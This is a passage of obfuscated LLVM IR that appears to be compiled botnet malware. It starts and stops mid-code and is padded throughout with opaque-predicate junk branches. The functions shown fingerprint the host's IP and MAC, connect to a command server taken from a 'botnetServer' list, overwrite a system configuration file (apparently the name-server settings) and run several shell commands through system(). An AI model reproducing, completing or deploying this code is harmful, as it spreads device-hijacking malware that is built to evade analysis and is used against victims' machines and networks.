  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [4096 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.ifreq, align 8
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %20, i32* %10, align 4
  %21 = load i32, i32* %10, align 4
  %22 = icmp eq i32 %21, -1
  %23 = load i32, i32* @x.99
  %24 = load i32, i32* @y.100
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %213

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.99
  %34 = load i32, i32* @y.100
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 16, i32 4, i1 false)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.306, i32 0, i32 0)) #3
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call zeroext i16 @htons(i16 zeroext 53) #10
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* %10, align 4
  %49 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %12, align 4
  %51 = load i32, i32* %12, align 4
  %52 = icmp eq i32 %51, -1
  %53 = load i32, i32* @x.99
  %54 = load i32, i32* @y.100
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %62

; <label>:61:                                     ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %213

; <label>:62:                                     ; preds = %originalBBpart24
  store i32 16, i32* %14, align 4
  %63 = load i32, i32* %10, align 4
  %64 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %65 = call i32 @getsockname(i32 %63, %struct.sockaddr* %64, i32* %14) #3
  store i32 %65, i32* %12, align 4
  %66 = load i32, i32* %12, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %62
  store i32 0, i32* %9, align 4
  br label %213

; <label>:69:                                     ; preds = %62
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %71 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %70, i32 0, i32 0
  %72 = load i32, i32* %71, align 4
  store i32 %72, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %73 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %73, i32* %15, align 4
  br label %74

; <label>:74:                                     ; preds = %originalBBpart212, %69
  %75 = load i32, i32* @x.99
  %76 = load i32, i32* @y.100
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %84 = load i32, i32* %15, align 4
  %85 = call i8* @fdgets(i8* %83, i32 4096, i32 %84)
  %86 = icmp ne i8* %85, null
  %87 = load i32, i32* @x.99
  %88 = load i32, i32* @y.100
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %86, label %95, label %129

; <label>:95:                                     ; preds = %originalBBpart28
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %97 = call i8* @strstr(i8* %96, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.308, i32 0, i32 0)) #9
  %98 = icmp ne i8* %97, null
  br i1 %98, label %99, label %111

; <label>:99:                                     ; preds = %95
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  store i8* %100, i8** %17, align 8
  br label %101

; <label>:101:                                    ; preds = %106, %99
  %102 = load i8*, i8** %17, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp ne i32 %104, 9
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %101
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  br label %101

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %17, align 8
  store i8 0, i8* %110, align 1
  br label %129

; <label>:111:                                    ; preds = %95
  %112 = load i32, i32* @x.99
  %113 = load i32, i32* @y.100
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %120, i8 0, i64 4096, i32 16, i1 false)
  %121 = load i32, i32* @x.99
  %122 = load i32, i32* @y.100
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %74

; <label>:129:                                    ; preds = %109, %originalBBpart28
  %130 = load i32, i32* %15, align 4
  %131 = call i32 @close(i32 %130)
  %132 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %133 = load i8, i8* %132, align 16
  %134 = icmp ne i8 %133, 0
  br i1 %134, label %135, label %194

; <label>:135:                                    ; preds = %129
  %136 = load i32, i32* @x.99
  %137 = load i32, i32* @y.100
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %135
  %144 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 0
  %145 = bitcast %union.anon.4* %144 to [16 x i8]*
  %146 = getelementptr inbounds [16 x i8], [16 x i8]* %145, i32 0, i32 0
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %148 = call i8* @strcpy(i8* %146, i8* %147) #3
  %149 = load i32, i32* %10, align 4
  %150 = call i32 (i32, i64, ...) @ioctl(i32 %149, i64 35111, %struct.ifreq* %19) #3
  store i32 0, i32* %18, align 4
  %151 = load i32, i32* @x.99
  %152 = load i32, i32* @y.100
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %159

; <label>:159:                                    ; preds = %190, %originalBBpart216
  %160 = load i32, i32* %18, align 4
  %161 = icmp slt i32 %160, 6
  br i1 %161, label %162, label %193

; <label>:162:                                    ; preds = %159
  %163 = load i32, i32* @x.99
  %164 = load i32, i32* @y.100
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %162
  %171 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %172 = bitcast %union.anon.5* %171 to %struct.sockaddr*
  %173 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %172, i32 0, i32 1
  %174 = getelementptr inbounds [14 x i8], [14 x i8]* %173, i32 0, i32 0
  %175 = load i32, i32* %18, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i8, i8* %174, i64 %176
  %178 = load i8, i8* %177, align 1
  %179 = load i32, i32* %18, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %180
  store i8 %178, i8* %181, align 1
  %182 = load i32, i32* @x.99
  %183 = load i32, i32* @y.100
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %190

; <label>:190:                                    ; preds = %originalBBpart220
  %191 = load i32, i32* %18, align 4
  %192 = add nsw i32 %191, 1
  store i32 %192, i32* %18, align 4
  br label %159

; <label>:193:                                    ; preds = %159
  br label %194

; <label>:194:                                    ; preds = %193, %129
  %195 = load i32, i32* @x.99
  %196 = load i32, i32* @y.100
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %194
  %203 = load i32, i32* %10, align 4
  %204 = call i32 @close(i32 %203)
  %205 = load i32, i32* @x.99
  %206 = load i32, i32* @y.100
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %213

; <label>:213:                                    ; preds = %originalBBpart224, %68, %61, %31
  %214 = load i32, i32* %9, align 4
  ret i32 %214

originalBBalteredBB:                              ; preds = %originalBB, %0
  %215 = alloca i32, align 4
  %216 = alloca i32, align 4
  %217 = alloca %struct.sockaddr_in, align 4
  %218 = alloca i32, align 4
  %219 = alloca %struct.sockaddr_in, align 4
  %220 = alloca i32, align 4
  %221 = alloca i32, align 4
  %222 = alloca [4096 x i8], align 16
  %223 = alloca i8*, align 8
  %224 = alloca i32, align 4
  %225 = alloca %struct.ifreq, align 8
  %226 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %226, i32* %216, align 4
  %227 = load i32, i32* %216, align 4
  %228 = icmp eq i32 %227, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %229 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %229, i8 0, i64 16, i32 4, i1 false)
  %230 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %230, align 4
  %231 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.306, i32 0, i32 0)) #3
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %232, i32 0, i32 0
  store i32 %231, i32* %233, align 4
  %234 = call zeroext i16 @htons(i16 zeroext 53) #10
  %235 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %234, i16* %235, align 2
  %236 = load i32, i32* %10, align 4
  %237 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %238 = call i32 @connect(i32 %236, %struct.sockaddr* %237, i32 16)
  store i32 %238, i32* %12, align 4
  %239 = load i32, i32* %12, align 4
  %240 = icmp eq i32 %239, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %241 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %242 = load i32, i32* %15, align 4
  %243 = call i8* @fdgets(i8* %241, i32 4096, i32 %242)
  %244 = icmp ne i8* %243, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %245 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %245, i8 0, i64 4096, i32 16, i1 false)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %135
  %246 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 0
  %247 = bitcast %union.anon.4* %246 to [16 x i8]*
  %248 = getelementptr inbounds [16 x i8], [16 x i8]* %247, i32 0, i32 0
  %249 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %250 = call i8* @strcpy(i8* %248, i8* %249) #3
  %251 = load i32, i32* %10, align 4
  %252 = call i32 (i32, i64, ...) @ioctl(i32 %251, i64 35111, %struct.ifreq* %19) #3
  store i32 0, i32* %18, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %162
  %253 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %254 = bitcast %union.anon.5* %253 to %struct.sockaddr*
  %255 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %254, i32 0, i32 1
  %256 = getelementptr inbounds [14 x i8], [14 x i8]* %255, i32 0, i32 0
  %257 = load i32, i32* %18, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8, i8* %256, i64 %258
  %260 = load i8, i8* %259, align 1
  %261 = load i32, i32* %18, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %262
  store i8 %260, i8* %263, align 1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %194
  %264 = load i32, i32* %10, align 4
  %265 = call i32 @close(i32 %264)
  br label %originalBB22
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %union.anon.6, align 4
  %3 = bitcast %union.anon.6* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %union.anon.6* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %union.anon.6* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %union.anon.6* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %union.anon.6* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %33 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %31
    i32 16777986, label %32
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.309 to i32), i32* %1, align 4
  br label %34

; <label>:14:                                     ; preds = %0
  %15 = load i32, i32* @x.101
  %16 = load i32, i32* @y.102
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  store i32 ptrtoint ([14 x i8]* @.str.310 to i32), i32* %1, align 4
  %23 = load i32, i32* @x.101
  %24 = load i32, i32* @y.102
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:31:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.311 to i32), i32* %1, align 4
  br label %34

; <label>:32:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.312 to i32), i32* %1, align 4
  br label %34

; <label>:33:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.313 to i32), i32* %1, align 4
  br label %34

; <label>:34:                                     ; preds = %33, %32, %31, %originalBBpart2, %13
  %35 = load i32, i32* @x.101
  %36 = load i32, i32* @y.102
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @x.101
  %45 = load i32, i32* @y.102
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %43

originalBBalteredBB:                              ; preds = %originalBB, %14
  store i32 ptrtoint ([14 x i8]* @.str.310 to i32), i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %52 = load i32, i32* %1, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = load i32, i32* @x.103
  %2 = load i32, i32* @y.104
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %12, i8 0, i64 4096, i32 16, i1 false)
  %13 = load i32, i32* @KadenCommStock, align 4
  %14 = icmp ne i32 %13, 0
  %15 = load i32, i32* @x.103
  %16 = load i32, i32* @y.104
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %26

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @KadenCommStock, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* @KadenCommStock, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %originalBBpart2
  %27 = load i32, i32* @botnetServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %26
  store i32 0, i32* @botnetServer, align 4
  br label %35

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* @botnetServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @botnetServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %31
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %37 = load i32, i32* @botnetServer, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1 x i8*], [1 x i8*]* @ServerInfo, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcpy(i8* %36, i8* %40) #3
  store i32 27, i32* %11, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #9
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #9
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #9
  store i32 %49, i32* %11, align 4
  %50 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #9
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %35
  %53 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %53, i32* @KadenCommStock, align 4
  %54 = load i32, i32* @KadenCommStock, align 4
  %55 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %56 = load i32, i32* %11, align 4
  %57 = call i32 @connectTimeout(i32 %54, i8* %55, i32 %56, i32 30)
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %76, label %59

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* @x.103
  %61 = load i32, i32* @y.104
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  store i32 1, i32* %9, align 4
  %68 = load i32, i32* @x.103
  %69 = load i32, i32* @y.104
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:76:                                     ; preds = %52
  store i32 0, i32* %9, align 4
  br label %77

; <label>:77:                                     ; preds = %76, %originalBBpart24
  %78 = load i32, i32* @x.103
  %79 = load i32, i32* @y.104
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = load i32, i32* %9, align 4
  %87 = load i32, i32* @x.103
  %88 = load i32, i32* @y.104
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %0
  %95 = alloca i32, align 4
  %96 = alloca [4096 x i8], align 16
  %97 = alloca i32, align 4
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %96, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %98, i8 0, i64 4096, i32 16, i1 false)
  %99 = load i32, i32* @KadenCommStock, align 4
  %100 = icmp ne i32 %99, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  store i32 1, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %101 = load i32, i32* %9, align 4
  br label %originalBB6
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = load i32, i32* @x.105
  %2 = load i32, i32* @y.106
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.314, i32 0, i32 0), i32 513)
  %13 = trunc i32 %12 to i16
  store i16 %13, i16* %9, align 2
  %14 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.314, i32 0, i32 0), i32 0) #3
  %15 = icmp ne i32 %14, -1
  %16 = load i32, i32* @x.105
  %17 = load i32, i32* @y.106
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %32

; <label>:24:                                     ; preds = %originalBBpart2
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.315, i32 0, i32 0), i8** %10, align 8
  %25 = load i8*, i8** %10, align 8
  %26 = call i64 @strlen(i8* %25) #9
  store i64 %26, i64* %11, align 8
  %27 = load i16, i16* %9, align 2
  %28 = zext i16 %27 to i32
  %29 = load i8*, i8** %10, align 8
  %30 = load i64, i64* %11, align 8
  %31 = call i64 @write(i32 %28, i8* %29, i64 %30)
  br label %49

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.105
  %34 = load i32, i32* @y.106
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* @x.105
  %42 = load i32, i32* @y.106
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %53

; <label>:49:                                     ; preds = %24
  %50 = load i16, i16* %9, align 2
  %51 = zext i16 %50 to i32
  %52 = call i32 @close(i32 %51)
  br label %53

; <label>:53:                                     ; preds = %49, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %54 = alloca i16, align 2
  %55 = alloca i8*, align 8
  %56 = alloca i64, align 8
  %57 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.314, i32 0, i32 0), i32 513)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %54, align 2
  %59 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.314, i32 0, i32 0), i32 0) #3
  %60 = icmp ne i32 %59, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.316, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.317, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.318, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.319, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.320, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i32 0, i32 0))
